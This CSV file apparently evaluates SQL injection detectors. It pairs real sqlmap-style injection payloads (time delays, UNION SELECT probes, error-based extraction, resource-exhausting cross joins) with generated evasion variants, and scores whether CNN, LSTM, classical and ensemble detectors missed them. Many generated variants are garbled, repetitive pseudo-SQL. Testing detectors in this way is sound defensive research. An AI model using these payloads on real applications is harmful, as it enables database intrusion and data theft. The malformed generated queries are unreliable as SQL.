original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
1') and (select * from (select(sleep(5)))fzno) and ('svwr'='svwr,SELECT DISTINCT'svwr' FROM SQL injection',1,0,1,1,1,1,1
"1"";select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",SELECT MIN(case) FROM SQL injection detection) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM query: 1,0,0,0,0,1,0,0
1%';select (case when (2783=9216) then 1 else 2783*(select 2783 from master..sysdatabases) end)--,SELECT MIN(select) FROM SQL injection_detective WHERE NOT SELECT MIN(select) FROM Query: 1%';select),0,0,0,0,1,0,0
"1"")) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
1'||(select 'yucg' where 2576=2576 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))||',SELECT MIN(select) FROM SQL injection detection WHERE '2576 = 2576 = 2576 AND 3754 ='select',0,1,0,0,0,0,0
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('inec'='inec","SELECT 'evadefg','sql injection' FROM SQL_injection' ORDER BY 'yes'",1,0,1,1,0,1,0
-4518 where 8023=8023 or 6872=6872--,SELECT * FROM Query: -4518 WHERE NOT SQL_injection = '8023=8023' OR 6872 = 6872-- for',1,1,0,0,0,0,0
"1,(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--",SELECT 0 FROM SQL_injections WHERE NOT ascii_regexp_substring(repeat(regexp_substring(repeat(repeat(repeat(repeat(regexp_substring(repeat(repeat(repeat(repeat(regexp_substring(repeat(repeat(repeat(regexp_substring(repeat)),1,0,0,0,1,0,0
-7648') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),"SELECT * FROM SQL injection_deficite', COUNT(*) FROM SQL_injection_deficite','sql injection'",1,0,1,0,1,1,0
"1' where 1836=1836 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",SELECT MIN(repeat(right(right(right) --) FROM SQL injection_detecting WHERE NOT null_injection = 'evade',1,1,0,0,1,0,0
"1%'))) union all select null,null,null,null,null,null,null,null--",SELECT MIN(sql) FROM SQL injection detection),1,0,1,1,1,1,1
"1%""))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","SELECT MIN(repeat(right(5012),0 FROM SQL injection_detecting) FROM SQL SELECT MIN(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(79)|char(79) FROM SELECT SQL_injection) FROM RESULT_SQL) AS t1 JOIN (SELECT MIN(repeat(right(right(right(right(right(right(right(right(right(right(right(right(right)|char(5000000000) FROM RESULT) AS t2 ON t1.null) ='sq injection')",1,1,0,0,1,0,0
"-5231%"" or 4945=8402#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -5231% OR 4945 = 8402#,1,1,0,1,1,1,0
"1%' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and '%'='",SELECT MIN(%) FROM SQL injection detection,1,0,0,1,1,1,0
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'='kiex","SELECT COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex' = 'evade SQL injection'",1,1,0,0,0,0,0
"1%');select benchmark(5000000,md5(0x714e4153))#","SELECT 5000000,md5(0x714e4153) FROM SQL injection_description",1,1,0,1,1,1,0
1' in boolean mode);(select * from (select(sleep(5)))srmq)#,SELECT DISTINCT select(sleep(5))) FROM SQL injection detection,1,1,0,0,1,0,0
-1765') order by 1--,SELECT MIN(1 - 72) FROM SQL injection detection,1,1,1,1,1,1,1
"1 and 8407=(select count(*) from generate_series(1,5000000))# tqmr","SELECT MIN(*) FROM query_series(1,5000000)# tqmr) FROM SQL injection detection",1,1,0,0,1,0,0
-2648') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('sawt'='sawt,SELECT MIN(case) FROM SQL injection_methods_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)| sqlid_to_sqlhash((sqlid_to_sqlid_to_sqlhash(sqlid_to_sqlid_to_sqlhash(sqlid_to_sqlhash((chr(113)) ='sqlid_to_sqlhash((chr(113)||chr(112)||chr(112)||chr(112)||chr(112)||chr(sqlid_to_sqlhash(sqlid_to_sqlhash((sqlid_to_sqlhash((chr,0,1,0,0,0,0,0
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)# cgow","SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3)# cgow FROM SQL injection",1,1,0,0,0,0,0
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""oyfk""=""oyfk",SELECT oyfk FROM SQL injections EXCEPT SELECT oyfk FROM (SELECT oyfk) FROM SQL_Injection) ORDER BY oyfk,0,0,0,1,1,1,0
"-8838"")) as xisn where 2749=2749 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",SELECT MIN(case) FROM SQL injection detection) FROM SQL - SELECT MIN(case) FROM SQL - SELECT MIN(case) FROM xisn WHERE 2749 = 2749 = 2749 OR 3440 = cast((chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) FROM SQL SELECT MIN(select) FROM SQL SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN((chr(2749 = 2749 = 2749 = 2749 = -8838),0,1,0,0,1,0,0
"1""))) and sleep(5) and (((""fdvc"" like ""fdvc","SELECT DISTINCT t1.((((((((((((((((()) FROM ""sql injection detection)"" AND NOT t1.sql injection detection = ""evade SQL injection detection""",1,1,0,0,0,0,0
"1"" where 9172=9172 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--","SELECT MIN(select) FROM SQL injection_detective WHERE elt(1045=1045,1) = 8484 union select 3051 union select 1210)",0,1,0,0,0,0,0
"1 and 3824=benchmark(5000000,md5(0x76555642))# igen",SELECT MIN(0x76555642) FROM SQL AS igen FROM query: 1 AND NOT md5(0x76555642) = igen,1,1,0,0,1,0,0
"1) where 5333=5333 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",SELECT MIN(*) FROM SQL injection detection WHERE NOT domain.domain.columns = '5333=5333' OR domain.domain.tables as t3)--,1,1,0,0,0,0,0
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))-- zvkh","SELECT MIN(sql) FROM SQL injection detection) FROM SQL SELECT 'abcdefg',upper(hex(hex(randomblob(500000000000/2))-- zvkh' FROM SQL injection",1,1,0,0,1,0,0
"1"") union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"1' and elt(1210=1210,sleep(5))","SELECT MIN(1210 = 1210,sleep(5)) FROM SQL injection detection",1,1,0,0,1,0,0
-5982' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ikuh'='ikuh,"SELECT MIN(case) FROM SQL injection detection) FROM SQL SELECT -5982', -chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) FROM SELECT MIN(select) FROM SQL injection detection",0,1,0,0,1,0,0
"1"")) as spvl where 2242=2242 or 6793=(select 6793 from pg_sleep(5))--",SELECT 6793 FROM pg_sleep(5)) AS :_spvl FROM SQL injection_diagnoses WHERE NOT spvl = 2242 = 2242 OR 6793 = (select 6793 FROM pg_sleep(5)),1,1,0,0,0,0,0
1')) and (1427=5813)*5813 and (('estb' like 'estb,SELECT 'estb' FROM SQL injection detection',1,0,1,1,1,1,1
"1 where 1842=1842 or 8514=benchmark(5000000,md5(0x544d5a4c))#",SELECT NOT md5(0x544d5a4c) FROM SQL AS t1 JOIN 1842 = 1842 OR t1.md5(0x544d5a4c) = 5000000,0,1,0,0,0,0,0
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))","SELECT MIN(select) FROM SQL injection_detective WHERE NOT elt(1297 = 1297,0x71706a71) = ""SQL injection""",0,1,0,0,1,0,0
"-4515"") or elt(4545=2509,2509) and (""lglx""=""lglx","SELECT lglx_lglx FROM SQL injection_detective WHERE NOT lglx_injection_detective_code IN (SELECT elt(4545=2509,2509) AND lglx_=""lglx"" = 'elt(4545=2509,2509)'",1,1,0,0,1,0,0
"1,(case when 5514=9602 then 1 else null end)",SELECT NOT (case) FROM query: 1 ORDER BY result,0,0,1,1,1,1,1
1))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((3505=3505,SELECT * FROM SQL injection_deficite' ORDER BY *(select),1,0,1,0,1,1,0
-7037')) as epsg where 3684=3684 union all select 3684--,SELECT epsg FROM SQL injection detection WHERE 3684 = 3684 = 3684,1,1,0,1,1,1,0
"1') and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","SELECT MIN(*) FROM SQL injection detection WHERE NOT domain.domain.columns = ""t1,domain.tables as t3)-- SELECT MIN(select count(*) FROM SQL injection detection""",1,1,0,0,1,0,0
1' where 5819=5819 and (1275=4759)*4759--,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1') or 8421=(select count(*) from generate_series(1,5000000)) and ('csmu'='csmu","SELECT'select count(*) FROM query_series(1,5000000) or query: 1' ORDER BY 'csmu'",1,1,0,0,1,0,0
"1';select like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'fpaf'='fpaf","SELECT'sql injection','sql injection' FROM SQL SELECT MIN(sequence) FROM query: 1';select like('abcdefg', 'fpaf' = 'fpaf'",1,1,0,0,1,0,0
"1') union all select null,null#",SELECT NOT null# FROM SQL injection detection,1,0,1,1,1,1,1
1 where 7516=7516 union all select null#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1 WHERE 7516 = 7516,1,1,1,0,1,1,0
"-2920"")) as zdgv where 9702=9702 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",SELECT MIN(select) FROM SQL injection_diagnosis WHERE 9702 = 9702 = 9702 OR 2724 = 2724 in ((((2724 = 2724) + chart(113) + chart(113) + chart(113) + chart(113) FROM SQL injection detection),0,1,0,0,1,0,0
1)));begin user_lock.sleep(5); end and (((3673=3673,"SELECT end,((3673 = 3673) FROM user_lock.sleep(5); end and ((((3673 = 3673) FROM SQL query: 1))",1,1,0,0,0,0,0
-6190'))) union all select 9413--,SELECT 9413-- FROM SQL injection_description WHERE NOT SELECT 9413-- FROM SQL_Injection_Procedures,1,1,1,1,1,1,1
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","SELECT * FROM SQL injection detection WHERE NOT domain.domain.columns = ""t1,"" ORDER BY domain.tables as t3--",1,1,1,1,0,1,0
"1%""));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",SELECT 6276 FROM SQL injection (SELECT 6276 FROM information_schema.character_sets) AS _end) AS _end_select AS _select_select AS _select_select_select_select_select_select_select_select_select_select_select_select_select_select_select_6276*(select 6276 = 6276*(schema.character_sets) end) FROM SQL injection',1,1,0,0,0,0,0
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('hfxu' like 'hfxu",SELECT COUNT(*) FROM SQL injection detection WHERE NOT all_users = 1 AND NOT all_users = 1 AND NOT all_users = 5556 = (SELECT 'hfxu' FROM SQL injection detection),1,1,0,0,0,0,0
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ""kszu""=""kszu","SELECT (SELECT case FROM SQL_injection) AND NOT kszu = ""kszu"" ORDER BY output",0,1,1,1,1,1,1
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'omlt'='omlt,"SELECT * FROM SQL injection_deficite', COUNT(*) FROM SQL_injection_deficite) AS :_text||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) FROM SQL injection detection WHERE NOT SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT SUM(SQL) FROM SELECT * FROM 'SQL'",1,1,0,0,1,0,0
-4607'||(select 'wkdg' where 7524=7524 order by 1--,SELECT -4607||(select 'wkdg' FROM SQL injection detection' ORDER BY -4607||(select 'wkdg'),1,1,0,0,0,0,0
"1"")) as qrrx where 4633=4633 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","SELECT MIN(*) FROM SQL injection detection WHERE qrrx = 4633 = 4633 AND all_users t3,all_users t4,all_users t5)--",1,1,0,0,0,0,0
1' in boolean mode) and 9198=9198--,"SELECT MIN(9198=9198--) FROM SQL injection detection WHERE NOT Query: 1' AND NOT Query: 1' AND NOT Query: 1' = ""boolean mode""",1,1,0,0,1,0,0
"1"" where 5372=5372 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","SELECT MIN(select count(*) FROM SQL injection detection WHERE 5372 = 5372 AND domain.domain.tables as t2, domain.tables as t3)-- SELECT MIN(select count(*) FROM SQL injection detection",1,1,0,0,0,0,0
"1' in boolean mode) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)#",SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT chr(112)||chr(65)||chr(103) = 2633 = dbms_pipe.receive_message(chr(112) ORDER BY SQL_injection_message,1,1,0,0,1,0,0
"1"") where 3679=3679;waitfor delay '0:0:5'--",SELECT MIN(3679 = 3679 = 3679;waitfor delay '0:0:5'-- for'sq injection',1,1,0,0,0,0,0
"-4838')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","SELECT MIN(select) FROM SQL injection detection WHERE NOT ix7171706a71 = ""SQL"" ORDER BY ix7171706a71,(select)",0,1,0,0,1,0,0
"1'+(select 'yzxc' where 5230=5230 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))+'","SELECT MIN(select) FROM SQL injection_repeat(left(crypt_key)||char(72) FROM SQL_repeat(select) FROM SQL_repeat WHERE NOT select = ""yzxc"" AND STRFTIME('%y', '%yzxc)'",0,1,0,0,1,0,0
"1"")) as fhlg where 1004=1004 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",SELECT MIN(case) FROM SQL injection detection WHERE '1004 = 1004' AND 2853 = cast((chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) as numeric) FROM SQL injection detection,0,1,0,0,0,0,0
-5995')) or 6872=6872 and (('pywh'='pywh,SELECT MIN((((((((((((((((((((((((((pywh))) FROM SQL injection) FROM SQL injection) ORDER BY 6872 = 6872,1,1,0,0,0,0,0
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('vvxk'='vvxk,SELECT'sequence' FROM SQL injection' AND NOT'sequence_injection' AND 'qqpjq'||'qqpjq' = '1 else 0 end from rdb$database)||'qzvzq',1,1,0,0,0,0,0
"-5064) as mzxc where 1889=1889 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",SELECT MIN(select) FROM SQL injection detection WHERE'sql injection' = 'evadesq',0,0,0,0,1,0,0
"1)) as ipfy where 1189=1189;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","SELECT * FROM SQL injection, SELECT SQL_injection FROM rdb$fields as t2,rdb$collations as t3,rdb$functions as t4-- SELECT * FROM SQL_injection WHERE evade_select = ""1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189 = 1189;select count(*) FROM rd",0,1,0,0,0,0,0
1) where 6494=6494;if(6745=4078) select 6745 else drop function ytyt--,SELECT 6745 = 4078 AS __percentage FROM SQL injection_description WHERE NOT 6745 = 6494 = 6494 = 6494 = 6494;if(6745 = 4078),1,1,0,0,0,0,0
"-2418'||(select 'mdbt' from dual where 3026=3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",SELECT MIN(select'sq injection') FROM SQL SELECT MIN(select'mdbt' FROM SQL SELECT MIN(select'mdbt') FROM SQL SELECT MIN(select'mdbt' FROM 3026 WHERE 3026 = 3026 = 3026,1,1,0,0,1,0,0
"1%"")) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""%""=""","SELECT SUM(*) FROM SQL injection detection WHERE NOT all_users = t1,all_users t3,all_users t4,all_users t5) and ((((((((((((((((((((((((((((((((((((((((()) FROM SQL injection detection))",1,1,0,0,0,0,0
1%')) and (8853=9924)*9924 and (('%'=',SELECT DISTINCT %'=',1,0,0,0,0,0,0
1 and sleep(5),"SELECT query: 1 and sleep(5) FROM query: 1 AND NOT SQL_injection = ""valid""",1,1,0,0,1,0,0
"1"" where 4298=4298 order by 1--",SELECT MIN(4298 = 4298 = 4298 ORDER BY 1--,1,1,0,0,0,0,0
"1'||(select 'xbvz' from dual where 1632=1632 union all select null,null,null,null,null,null,null,null--",SELECT 'xbvz' FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SELECT MIN(select 'xbvz' FROM SQL SELECT MIN(select) FROM SQL SELECT SUM(SQL) FROM SELECT SUM(select 'xbvz' FROM SQL SELECT MIN(select) FROM SQL SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL,0,0,0,0,1,0,0
"1'+(select qmez where 3729=3729 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","SELECT qmez FROM SQL JOIN Query: 1'+(select qmez) FROM SQL JOIN SELECT SELECT qmez FROM 3729 WHERE 3729 = 3729 AND 8148 = like('abcdefg',upper(hex(randomblob(500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000/2)) FROM SELECT SELECT MIN(select qmez) FROM SELECT SUM(select qmez) FROM SELECT SELECT & randomblob(500000000000000000000000000000000000000000000000000/2) FROM SELECT SUM(hex(randomblob(500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000/2) FROM SELECT SUM(select'select qmez) = 'ab",0,1,0,0,1,0,0
"1) where 7729=7729;iif(5257=5257,1,1/0)","SELECT NOT SQL_Inject_Required FROM query: 1) WHERE NOT 7729 = 7729;iif(5257 = 5257,1,1/0) = 7729",1,1,0,0,0,0,0
"1""));select pg_sleep(5) and ((""byhx"" like ""byhx","SELECT pg_sleep(5), (((((()byhx) FROM SQL injection detection) FROM SQL injection detection",1,1,0,0,1,0,0
"1%' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and '%'='","SELECT * FROM SQL injection_deficite','sql injection','sql injection detection'",0,0,1,1,1,1,1
"1"" and elt(8464=5761,5761) and ""ydmt"" like ""ydmt","SELECT MIN(5761,5761) FROM SQL injection detection WHERE NOT SELECT SELECT MIN(8464 = 5761,5761) FROM ""ydmt"" AND NOT SELECT SELECT MIN(8464 = 5761,5761) FROM SQL injection detection",1,1,1,1,1,1,1
"1"") and (select * from (select(sleep(5)))fzno) and (""ppml""=""ppml",SELECT MIN(select(sleep(5)))fzno) FROM SQL injection detection WHERE NOT SELECT DISTINCT select_from (select(sleep(5))) FROM (SELECT SUM(select_sleep(5))) FROM SQL injection detection),1,1,0,0,1,0,0
"1) as zbha where 9700=9700 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",SELECT MIN(sql injection) FROM SQL_injection WHERE 9700 = 9700 OR 6979 = like('abcdefg'),1,1,0,0,0,0,0
1') or 6793=(select 6793 from pg_sleep(5)) and ('dtzt' like 'dtzt,SELECT 6793 FROM pg_sleep(5) or (SELECT 6793 FROM pg_sleep(5)),1,1,0,0,1,0,0
"-6554'))) union all select 4384,4384,4384,4384,4384#","SELECT MIN(sql injection) FROM 4384,4384,4384,4384# FROM SQL_Injection_method_code WHERE NOT -6554') = 'example'",1,1,0,0,0,0,0
"-8612'+(select 'iqla' where 5035=5035 union all select 5035,5035,5035,5035,5035,5035,5035#","SELECT MIN(5035 = 5035,5035,5035,5035#) FROM SQL injection_description",1,1,1,1,0,1,0
"-9966')) union all select 7230,7230,7230,7230,7230,7230,7230#","SELECT MIN(7230), 7230,7230,7230,7230,7230# FROM SQL injection_description WHERE NOT SELECT MIN(SQL) FROM SELECT 7230,7230,7230,7230,7230,7230# FROM SQL_Injection_Required = ""done""",1,1,1,0,0,0,0
"1%"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""","SELECT DISTINCT case FROM SQL injection detection WHERE NOT SELECT DISTINCT SELECT DISTINCT %, % FROM SQL",0,0,0,1,1,1,0
1'))) and sleep(5)#,SELECT MIN(swimmer(5)#) FROM SQL injection detection,0,1,0,0,1,0,0
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('yqzg'='yqzg","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3) and (SELECT * FROM SQL injection_methods WHERE NOT sysibm.systables as t3 and (SELECT 'yqzg' FROM sysibm.systables as t2) and (SELECT * FROM sysibm.syqzg' = 3707 ='sqzg')",1,1,0,0,0,0,0
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('uzxr'='uzxr",SELECT (SELECT case FROM SQL_injection) AND NOT 'uzxr' = 'uzxr'),0,1,0,0,1,0,0
"-9699"")) or (8459=8459)*4906 and ((""dufs""=""dufs",SELECT DISTINCT _dufs FROM SQL injection_description WHERE NOT SELECT -9699) = 'example',1,1,0,1,1,1,0
"1"" and 7533=7533",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1%'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('%'='","SELECT * FROM SQL_injection, SELECT * FROM SELECT * FROM SQL_injection, SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SQL_injection, SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECTSQ(extractvalue(extractvalue(extractvalue(extractvalue(extractvalue(extractvalue(output) FROM SQL_injection)",1,0,0,1,1,1,0
"-9140"")) union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1'+(select 'vabj' where 7178=7178 union all select null,null,null,null,null#",SELECT DISTINCT 'evade SQL injection detection' FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM sq injected detection,1,0,0,1,1,1,0
"1'||(select 'jjpy' from dual where 6295=6295;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","SELECT MIN(select) FROM SQL injection, SELECT 'jjpy' FROM SQL SELECT SELECT 'jjpy' FROM query: 1'||(select) FROM query: 1'||(select) FROM SQL injection detection'",0,1,0,0,1,0,0
"1%';select benchmark(5000000,md5(0x714e4153))#",SELECT MIN(0x714e4153) FROM SQL injection_description,1,1,0,1,1,1,0
-4351') or 6525=9458,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -4351' OR -4351 = 6525 = 9458,1,1,0,0,0,0,0
"-4756"")) union all select 6846,6846,6846,6846,6846,6846,6846#","SELECT 6846,6846,6846,6846# FROM SQL injection_description WHERE NOT 6846,6846,6846,6846 = ""SQL""",1,1,1,1,0,1,0
"1')) or elt(6272=6272,sleep(5)) and (('cwjd'='cwjd","SELECT DISTINCT elt(6272 = 6272,sleep(5)) FROM SQL injection_detection",1,1,0,0,1,0,0
"1"") as gjlv where 1983=1983 and sleep(5)#","SELECT MIN(sql injection) FROM SQL SELECT MIN(1983 = 198) FROM gjlv WHERE ""sqlv"" = ""sql injection""",1,1,0,0,0,0,0
"1')) or 8421=(select count(*) from generate_series(1,5000000)) and (('lqpd'='lqpd","SELECT DISTINCT _count(*) FROM query_series(1,5000000) ORDER BY COUNT(*)",1,1,0,0,1,0,0
"1 where 4372=4372;select * from generate_series(3086,3086,case when (3086=3327) then 1 else 0 end) limit 1--","SELECT MIN(1 AS _end__) FROM SQL_injection_deficitor WHERE NOT SELECT * FROM generate_series(3086,3086 = 3327)",1,1,1,0,1,1,0
1));select (case when (8113=8981) then 8113 else 1/(select 0) end)--,SELECT 1/(select 0) end) FROM SQL injection detection,1,1,0,0,1,0,0
